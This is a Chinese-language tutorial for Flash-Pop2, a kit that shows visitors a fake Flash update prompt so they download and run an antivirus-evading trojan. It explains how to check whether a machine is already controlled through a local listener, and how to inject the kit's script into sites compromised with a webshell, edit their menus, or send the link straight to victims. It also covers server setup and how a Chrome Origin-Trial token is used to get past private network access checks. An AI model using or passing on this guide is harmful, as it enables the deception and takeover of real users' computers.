> 项目地址：https://github.com/chroblert/Flash-Pop2  
> 本项目基于https://github.com/r00tSe7en/Flash-Pop进行改造

# 0x01 目标

## 页面展示：

![](https://image.3001.net/images/20211107/1636282668_6187b12c0452da60f613e.png!small)

## flash页面目标：

  1. flash页面能够判断当前系统是否已被安装flash马

  2. flash页面能够判断当前系统是否是Windows，若不是则跳转到正常或指定页面

  3. flash安装完成后需能跳转到正常或指定页面

## flash马目标

  1. flash马能够起一个本地服务

  2. flash马能够免杀

  3. flash马能够捆绑或释放正常flash安装文件

## 过程：

  1. 首先判断系统是否为Windows，若不是则显示正常页面或指定页面；

  2. 若是Windows，则请求本地1341端口，判断当前机器是否已被控制。

    * 若已被控制，则显示正常页面或跳转到指定页面

    * 若未被控制，则弹窗显示flash升级页面

  3. 等待用户点击”立即升级“按钮

  4. 用户点击后，js开始每10秒判断一次是否成功执行了程序；

    * 若已执行，则跳转到正常页面或指定页面

    * 若未执行，则停留在flash弹窗页面

## 应用场景（a_type）：

  1. 已有webshell，可以修改源码，

    * 在目标网站的页面源码中直接插入js：已安装flash的情况下，不做任何操作；未安装flash，弹出flash页面，定时检测，安装完成后，页面刷新 [0]

  2. 没有webshell，可以修改目标网站的导航菜单：

    * 添加自己的flash页面，供受害者点击；

    * 如果设置了特定页面，则当安装完成后，则跳转到指定页面；

    * 若未设置，则跳转到document.referrer(如果其不包含js中设置的域名)[1]

  3. 直接发送给对方

    * 对方直接在浏览器中输入flash地址：如果安装完成后，则直接跳转到指定页面；[2]

# 0x02 使用

## (一) 条件：

  1. 一台vps

  2. 一个域名

  3. 谷歌账号

## (二) 步骤：

### 配置网站

这里推荐宝塔，太方便了

  1. 安装宝塔

    * ![](https://image.3001.net/images/20211107/1636282669_6187b12d54975de4fb5ec.png!small)

  2. 创建网站

    * ![](https://image.3001.net/images/20211107/1636282670_6187b12e731dab6d2616b.png!small)

    * 在购买域名的地方，添加dns解析到服务器IP

    * 在宝塔网站->设置->一键配置ssl

  3. 下载flash页面并上传到宝塔创建的网站目录下面

    * flash项目地址：https://github.com/chroblert/Flash-Pop2

  4. 申请Origin-Trial

    * 访问https://developer.chrome.com/origintrials/#/trials/active

    * 选择并注册Private Network Access from non-secure contexts

    * ![](https://image.3001.net/images/20211107/1636282671_6187b12fdbaecc615cc83.png!small)

    * 填写信息并注册

    * ![](https://image.3001.net/images/20211107/1636282673_6187b13145ed811dccd7b.png!small)

    * 注册成功后会返回一些信息

    * ![](https://image.3001.net/images/20211107/1636282674_6187b132b3d6ffc5e4bf8.png!small)

    * 一个token值，该值在2021年12月31日前有效，之后就需要重新申请

  5. 宝塔网站配置Origin-Trial响应头

    * 在网站->设置->配置文件中添加

    * add_header Origin-Trial <上步中的token值>

    * 添加成功后，响应应该如下

    * ![](https://image.3001.net/images/20211107/1636282675_6187b133ea96cdf1d744e.png!small)

### 设置flash参数

  1. 下载flash-pop2项目后，进入js文件夹下修改flash.js文件中的参数  
![](https://image.3001.net/images/20211107/1636282677_6187b1353f130429c5be3.png!small)

  2. 配置说明

    * ttarget： 宝塔网站设置的域名

    * target_file: flash马的下载地址

    * bc_link: 要跳转到的指定页面

    * pb_word: 如上图

    * l_url: flash马在本地监听的http服务

    * l_res: flash马在本地监听的http服务返回的响应

    * a_type: 应用场景

  3. flash马

    * flash马中应该起一个http服务，并返回设置的l_res内容

    * flash马中的http服务应该返回一个用于解决跨域问题的响应头 Access-Control-Allow-Origin: *

    * 示例如下：

    * ![](https://image.3001.net/images/20211107/1636282678_6187b1362eb35e051534b.png!small)

    * ![](https://image.3001.net/images/20211107/1636282678_6187b136f0e739ce094ea.png!small)

### 应用

  1. 已有webshell，可以修改网站源代码

    * 修改网站源码，添加`<script src=//flash-pop2-domain.com/js/flash.js></script>`

    * 这里目标网站用什么，这里就填什么。如果目标网站是http，这里却是https，那么chrome会出现cors问题，firefox没这个问题…

  2. 没有webshell，可以修改网站菜单

    * 添加或修改菜单链接为https://flash-pop2-domain.com/index.html

  3. 直接发送给客服或者受害者

    * 将https://flash-pop2-domain.com/index.html直接发送给对方

参考资料：[XHR](https://www.jianshu.com/p/4a29309b3ba2)

参考资料：[原生js dom操作汇总](https://harttle.land/2015/10/01/javascript-dom-api.html)

参考资料：[山寨“特x版”flash](https://zhuanlan.zhihu.com/p/343487727)

参考资料：[检测与隐藏CS服务器](https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/#CDN)

参考资料：[CF源IP问题](https://blog.csdn.net/jsbba/article/details/121011835)

参考资料：[http 远程站点请求 ip 地址报 CORS 错误](https://kebingzao.com/2021/10/11/chrome-private-cors-error/)

参考资料：[CDN添加自定义响应头](https://kebingzao.com/2020/04/26/cloudfront-add-x-frame-options/)

参考资料：[cf使用worker添加响应头](https://blog.dsrkafuu.su/post/2020/cloudflare-worker-cors-anywhere/)

参考资料：[一个大坑-请求报错会导致window.onload无法执行](https://stackoverflow.com/questions/25395119/catch-asynchronous-network-error-from-xmlhttprequest-send)

参考资料：[资源加载：onload，onerror](https://zh.javascript.info/onload-onerror)

